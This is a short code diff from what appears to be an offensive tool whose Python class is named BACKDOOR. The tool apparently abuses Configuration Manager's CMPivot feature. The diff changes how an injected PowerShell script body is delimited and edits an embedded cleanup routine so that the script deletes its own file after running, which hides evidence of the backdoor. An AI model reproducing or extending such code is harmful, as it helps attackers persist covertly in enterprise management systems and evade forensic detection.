@@ -63,11 +63,12 @@ class BACKDOOR:
     def update_cmpivot(self, option):
         #read the script provided and transform to the expected format for API
         try:
-            match = "# SIG # Begin signature block"
+            #match = "# SIG # Begin signature block"
+            match = "# Finish off Xml"
             script_body = ""
             cleanup = '''
 function Do-Delete {
-    Remove-Item $PSScriptRoot -Force 
+    Remove-Item $MyInvocation.PSCommandPath -Force 
 }
 Do-Delete
 '''
